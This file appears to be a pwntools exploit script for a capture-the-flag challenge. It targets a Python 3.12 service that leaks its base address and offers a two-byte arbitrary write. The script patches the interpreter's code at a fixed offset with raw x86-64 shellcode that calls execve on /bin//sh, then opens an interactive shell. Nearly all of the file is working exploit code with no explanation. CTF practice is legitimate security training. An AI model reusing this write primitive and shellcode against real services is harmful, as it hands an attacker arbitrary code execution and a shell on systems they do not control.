#!/usr/bin/env python3

import logging
from pwn import *

# context.log_level = "critical"
# context.log_level = "debug"

run_str = "./python3.12/bin/python3.12"
log.setLevel(logging.DEBUG)
p: process = None

def at(pre=""):
    gdb.attach(p, pre)


args.LOCAL = 0
args.DEBUG = 0

pre = \
"""
c
"""

def conn():
    global p
    if args.LOCAL:
        p = process([run_str, './pon1.py'])
        if args.DEBUG:
            p = gdb.debug([run_str, './pon1.py'], pre)
    else:
        #p = remote("ponpy.ctfz.zone", 21337)
        p = remote("127.0.0.1", 21337)

    return p


def arb_write(addr, data):
    for i in range(0, len(data), 2):
        p.sendlineafter(b"Gimme the off: ", hex(addr + i).encode())
        p.sendafter(b"Gimme the loot: ", data[i:i+2])

def main():
    conn()
    p.recvuntil(b"You desired python base is 0x")
    addr = int(p.recvline()[:-1], 16)
    built = addr + 0x324bfb
    debug("Got addr: 0x%x", addr)
    debug("Got addr: 0x%x", built)
    arb_write(built, b"\xeb\xec")
    arb_write(built+2, b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x00")
    arb_write(built, b"\x90\x90")
    p.interactive()


def with_reset():
    while True:
        try:
            main()
        except Exception:
            pass
        p.close()

def no_reset():
    main()

if __name__ == "__main__":
    # with_reset()
    no_reset()

